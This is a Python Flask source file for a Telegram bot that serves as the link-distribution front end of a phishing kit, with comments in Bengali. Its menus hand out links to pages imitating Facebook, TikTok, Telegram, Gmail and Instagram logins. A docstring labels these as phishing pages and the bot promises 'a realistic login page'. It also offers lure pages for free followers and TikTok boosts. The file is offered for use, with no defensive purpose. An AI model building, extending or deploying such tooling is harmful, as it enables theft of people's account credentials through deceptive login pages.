import logging
import requests
import json
import os
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from config import TELEGRAM_BOT_TOKEN, PORT

# Flask অ্যাপ (ওয়েবহুক রিসিভ করার জন্য)
app = Flask(__name__)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

URL_FILE = "saved_url.json"

def save_url(url):
    try:
        with open(URL_FILE, 'w') as f:
            json.dump({'url': url}, f)
    except:
        pass

def load_saved_url():
    try:
        if os.path.exists(URL_FILE):
            with open(URL_FILE, 'r') as f:
                data = json.load(f)
                return data.get('url')
    except:
        pass
    return None

def get_public_url():
    saved_url = load_saved_url()
    if saved_url:
        return saved_url
    return os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')

def get_local_ip():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def send_message(chat_id, text, reply_markup=None):
    """টেলিগ্রামে মেসেজ পাঠানোর ফাংশন"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error sending message: {e}")
        return None

def edit_message(chat_id, message_id, text, reply_markup=None):
    """টেলিগ্রামের মেসেজ এডিট করার ফাংশন"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error editing message: {e}")
        return None

def answer_callback(callback_id, text=None):
    """ক্যালব্যাক কোয়েরির উত্তর দিন"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {'callback_query_id': callback_id}
    if text:
        payload['text'] = text
    
    try:
        requests.post(url, json=payload)
    except:
        pass

# ============= মেনু এবং হ্যান্ডলার =============

def start(chat_id, message_id=None):
    """স্টার্ট মেনু দেখান"""
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 All Mane page", "callback_data": "All_Mane_page"}],
            [{"text": "📢 advance page", "callback_data": "All_advance_page"}],
            [{"text": "🦅 Status", "callback_data": "status"},
             {"text": "🥷 community", "url": "https://t.me/+j8x9Tp4CGa80ZmM1"}]
        ]
    }
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    if message_id:
        return edit_message(chat_id, message_id, message, keyboard)
    else:
        return send_message(chat_id, message, keyboard)

def all_menu(chat_id, message_id):
    """All Mane page মেনু"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📘 Facebook", "callback_data": "_facebook"}],
            [{"text": "🤤 TikTok", "callback_data": "_tiktok"}],
            [{"text": "✈️ Telegram", "callback_data": "_telegram"}],
            [{"text": "📧 Gmail", "callback_data": "_gmail"}],
            [{"text": "📷 Instagram", "callback_data": "_instagram"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }
    edit_message(chat_id, message_id, "😈 All Mane page Platforms\n\nSelect a platform:", keyboard)

def advance_menu(chat_id, message_id):
    """Advance page মেনু"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "🎯 ফ্রি ফলোয়ার", "callback_data": "_at"}],
            [{"text": "📞 ফ্রি কল / Whatsapp", "callback_data": "_ai"}],
            [{"text": "📢 TikTok বুস্টার", "callback_data": "_ad"}],
            [{"text": "🚀 TikTok ফলোয়ার", "callback_data": "_go"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }
    edit_message(chat_id, message_id, "📢 advance page Menu\n\nSelect an option:", keyboard)

def page_link(chat_id, message_id, page_type, page_name, url_path):
    """পেজ লিংক দেখান (ফিশিং পেজের জন্য)"""
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    full_url = f"{public_url}/{url_path}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 Open Public URL", "url": full_url}],
            [{"text": "📍 Open Local URL", "url": local_url}],
            [{"text": "🔙 Back", "callback_data": "All_Mane_page"}]
        ]
    }
    
    message = f"""{page_name} Link

🌐 **Public URL:**
`{public_url}/{url_path}`

📍 **Local URL:**
`{local_url}`

This link will show a realistic {page_name} login page.
"""
    edit_message(chat_id, message_id, message, keyboard)

def advance_link(chat_id, message_id, title, url_path):
    """অ্যাডভান্স পেজের লিংক দেখান"""
    public_url = get_public_url()
    full_url = f"{public_url}/{url_path}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 ওপেন পেজ", "url": full_url}],
            [{"text": "🔙 Back", "callback_data": "All_advance_page"}]
        ]
    }
    edit_message(chat_id, message_id, f"{title}\n\n🔗 {full_url}", keyboard)

def status(chat_id, message_id):
    """বট স্ট্যাটাস দেখান"""
    public_url = get_public_url()
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }
    
    message = f"""Bot Status

🦅 Bot Status: 🟢 Active
🦅 **Public URL:** `{public_url}`
📍 **Local URL:** `{local_url}`
🔌 **Port:** {PORT}

🛡️ All systems operational."""
    edit_message(chat_id, message_id, message, keyboard)

# ============= ওয়েবহুক এন্ডপয়েন্ট =============

@app.route(f'/webhook/{TELEGRAM_BOT_TOKEN}', methods=['POST'])
def webhook():
    """টেলিগ্রাম থেকে ওয়েবহুক গ্রহণ করে"""
    try:
        update = request.get_json()
        
        if not update:
            return jsonify({"status": "ok"})
        
        # মেসেজ হ্যান্ডলিং
        if 'message' in update:
            msg = update['message']
            chat_id = msg['chat']['id']
            
            # কমান্ড হ্যান্ডলিং
            if 'text' in msg:
                text = msg['text']
                if text == '/start' or text == '/link':
                    start(chat_id, None)
        
        # ক্যালব্যাক কোয়েরি হ্যান্ডলিং
        elif 'callback_query' in update:
            cb = update['callback_query']
            chat_id = cb['message']['chat']['id']
            message_id = cb['message']['message_id']
            data = cb['data']
            callback_id = cb['id']
            
            answer_callback(callback_id)
            
            if data == "All_Mane_page":
                all_menu(chat_id, message_id)
            elif data == "All_advance_page":
                advance_menu(chat_id, message_id)
            elif data == "main_menu":
                start(chat_id, message_id)
            elif data == "status":
                status(chat_id, message_id)
            elif data == "_facebook":
                page_link(chat_id, message_id, "Facebook", "😈 Facebook pk Link", "facebook")
            elif data == "_tiktok":
                page_link(chat_id, message_id, "TikTok", "🔗 TikTok pk Link", "tiktok")
            elif data == "_telegram":
                page_link(chat_id, message_id, "Telegram", "🤧 Telegram pk Link", "telegram")
            elif data == "_gmail":
                page_link(chat_id, message_id, "Gmail", "🔗 Gmail pk Link", "gmail")
            elif data == "_instagram":
                page_link(chat_id, message_id, "Instagram", "🫂 Instagram pk Link", "instagram")
            elif data == "_at":
                advance_link(chat_id, message_id, "🎯 ফ্রি ফেসবুক ফলোয়ার", "facebook_followers")
            elif data == "_ai":
                advance_link(chat_id, message_id, "📞 ফ্রি কল / হোয়াটসঅ্যাপ গ্রুপ", "whatsapp_groups")
            elif data == "_ad":
                advance_link(chat_id, message_id, "📢 TikTok ভিউ+লাইক বুস্টার", "tiktok_boost")
            elif data == "_go":
                advance_link(chat_id, message_id, "🚀 TikTok ফ্রি ফলোয়ার", "tiktok_followers")
        
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/')
def index():
    return "Telegram Bot Webhook is running!"

def set_webhook():
    """ওয়েবহুক সেট আপ করুন"""
    render_url = get_public_url()
    webhook_url = f"{render_url}/webhook/{TELEGRAM_BOT_TOKEN}"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
    response = requests.post(url, json={'url': webhook_url})
    
    if response.status_code == 200:
        print(f"✅ Webhook set to: {webhook_url}")
        return True
    else:
        print(f"❌ Failed to set webhook: {response.text}")
        return False

def run_bot():
    """বট চালান (ওয়েবহুক সেটআপ সহ)"""
    set_webhook()
    print("🦅 Telegram Bot is ready (Webhook mode)")

if __name__ == '__main__':
    run_bot()
    app.run(host='0.0.0.0', port=PORT, debug=False)
